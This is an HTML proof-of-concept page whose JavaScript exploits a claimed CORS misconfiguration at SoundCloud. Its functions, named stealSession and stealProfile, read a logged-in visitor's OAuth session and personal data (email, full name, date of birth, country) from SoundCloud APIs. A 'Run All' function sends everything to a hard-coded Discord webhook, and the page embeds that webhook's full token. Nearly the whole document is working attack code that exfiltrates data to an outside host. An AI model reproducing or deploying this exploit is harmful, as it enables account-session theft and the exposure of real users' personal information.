<!DOCTYPE html>
<html>
<head>
    <title>SoundCloud CORS PoC</title>
    <style>
        body { background: #1a1a2e; color: #e0e0e0; font-family: monospace; padding: 20px; }
        h1 { color: #ff4444; }
        pre { background: #16213e; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; }
        button { background: #ff4444; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px; margin: 5px; }
        button:hover { background: #cc0000; }
        .success { color: #00ff00; }
        .fail { color: #ff4444; }
        .info { color: #4488ff; }
        #log { max-height: 600px; overflow-y: auto; }
    </style>
</head>
<body>
    <h1>SoundCloud CORS Misconfiguration PoC (V21)</h1>
    <p>secure.soundcloud.com reflects ANY origin with Access-Control-Allow-Credentials: true</p>
    <p><b>You must be logged into SoundCloud in this browser for this to work.</b></p>
    <hr>
    <button onclick="testCORS()">1. Test CORS Headers</button>
    <button onclick="stealSession()">2. Steal OAuth Session</button>
    <button onclick="stealProfile()">3. Read Profile (PII)</button>
    <button onclick="runAll()">Run All + Exfil to Webhook</button>
    <button onclick="clearLog()">Clear</button>
    <hr>
    <h3>Results:</h3>
    <pre id="log"></pre>

    <script>
        const CLIENT_ID = "khI8ciOiYPX6UVGInQY5zA0zvTkfzuuC";
        const WEBHOOK = "https://discord.com/api/webhooks/1482658590866280539/0ZTqcA_-tZYeIVisBFYGS_xRmdTruYJvNAHuREeVZTk7IPjN5RkdsM_pF6XtaK6SdRNW";

        function log(msg, cls) {
            const el = document.getElementById("log");
            const line = document.createElement("div");
            line.className = cls || "";
            line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
            el.appendChild(line);
            el.scrollTop = el.scrollHeight;
        }

        function clearLog() { document.getElementById("log").innerHTML = ""; }

        async function sendToWebhook(data) {
            try {
                await fetch(WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        embeds: [{
                            title: "SoundCloud CORS PoC - Exfiltrated Data",
                            color: 16711680,
                            fields: data.map(function(d) {
                                return { name: d.name, value: String(d.value).substring(0, 1024) };
                            }),
                            footer: { text: "Origin: " + window.location.origin + " | " + new Date().toISOString() }
                        }]
                    })
                });
                log("Data sent to webhook!", "success");
            } catch(e) {
                log("Webhook error: " + e.message, "fail");
            }
        }

        async function testCORS() {
            log("=== CORS Header Test ===", "info");
            log("Our origin: " + window.location.origin, "info");
            var results = [];

            var endpoints = [
                { url: "https://secure.soundcloud.com/oauth/token", name: "secure.soundcloud.com" },
                { url: "https://api-auth.soundcloud.com/oauth/session?client_id=" + CLIENT_ID, name: "api-auth" },
                { url: "https://api-v2.soundcloud.com/me?client_id=" + CLIENT_ID, name: "api-v2" }
            ];

            for (var i = 0; i < endpoints.length; i++) {
                var ep = endpoints[i];
                log("Testing: " + ep.name, "info");
                try {
                    var resp = await fetch(ep.url, { credentials: "include" });
                    var acao = resp.headers.get("access-control-allow-origin");
                    var acac = resp.headers.get("access-control-allow-credentials");
                    log("  Status: " + resp.status, "info");
                    log("  ACAO: " + acao, acao ? "success" : "fail");
                    log("  ACAC: " + acac, acac === "true" ? "success" : "info");
                    if (acao === window.location.origin) {
                        log("  VULNERABLE - Origin reflected!", "success");
                    }
                    results.push({ name: ep.name, value: "ACAO: " + acao + " | ACAC: " + acac + " | Status: " + resp.status });
                } catch(e) {
                    log("  Blocked by browser: " + e.message, "fail");
                    results.push({ name: ep.name, value: "BLOCKED: " + e.message });
                }
            }
            return results;
        }

        async function stealSession() {
            log("=== Stealing OAuth Session ===", "info");
            var result = { name: "OAuth Session", value: "failed" };

            try {
                var resp = await fetch(
                    "https://api-auth.soundcloud.com/oauth/session?client_id=" + CLIENT_ID,
                    { credentials: "include" }
                );
                log("Status: " + resp.status, "info");
                var text = await resp.text();

                if (resp.ok && text && text !== "{}") {
                    log("SESSION STOLEN!", "success");
                    log(text, "success");
                    result.value = text.substring(0, 1024);
                } else {
                    log("Response: " + text.substring(0, 500), "info");
                    result.value = "Status " + resp.status + ": " + text.substring(0, 500);
                }
            } catch(e) {
                log("Error: " + e.message, "fail");
                result.value = "Error: " + e.message;
            }
            return result;
        }

        async function stealProfile() {
            log("=== Reading Victim Profile ===", "info");
            var result = { name: "Profile", value: "failed" };

            try {
                var resp = await fetch(
                    "https://api-v2.soundcloud.com/me?client_id=" + CLIENT_ID,
                    { credentials: "include" }
                );
                log("Status: " + resp.status, "info");

                if (resp.ok) {
                    var data = await resp.json();
                    log("PROFILE DATA STOLEN!", "success");
                    log("  Username: " + data.username, "success");
                    log("  Email: " + data.primary_email, "success");
                    log("  User ID: " + data.id, "success");
                    log("  Full Name: " + data.full_name, "success");
                    log("  DOB: " + JSON.stringify(data.date_of_birth), "success");
                    log("  Country: " + data.country_code, "success");
                    log("  Verified: " + data.verified, "success");
                    log("Full response:", "info");
                    log(JSON.stringify(data, null, 2).substring(0, 2000), "success");

                    result.value = "Username: " + data.username +
                        "\nEmail: " + data.primary_email +
                        "\nUser ID: " + data.id +
                        "\nFull Name: " + data.full_name +
                        "\nDOB: " + JSON.stringify(data.date_of_birth) +
                        "\nCountry: " + data.country_code +
                        "\nVerified: " + data.verified;
                } else {
                    var text = await resp.text();
                    log("Not logged in or blocked: " + text.substring(0, 200), "fail");
                    result.value = "Status " + resp.status + ": " + text.substring(0, 200);
                }
            } catch(e) {
                log("Error: " + e.message, "fail");
                log("If CORS blocks this, the api-v2 only reflects *.soundcloud.com origins", "info");
                result.value = "Error: " + e.message;
            }
            return result;
        }

        async function runAll() {
            log("=== Running Full PoC + Exfiltrating to Webhook ===", "info");
            var webhookData = [];

            // CORS test
            var corsResults = await testCORS();
            if (corsResults) webhookData = webhookData.concat(corsResults);

            // Session steal
            var sessionResult = await stealSession();
            webhookData.push(sessionResult);

            // Profile steal
            var profileResult = await stealProfile();
            webhookData.push(profileResult);

            // Send everything to webhook
            await sendToWebhook(webhookData);
        }
    </script>
</body>
</html>
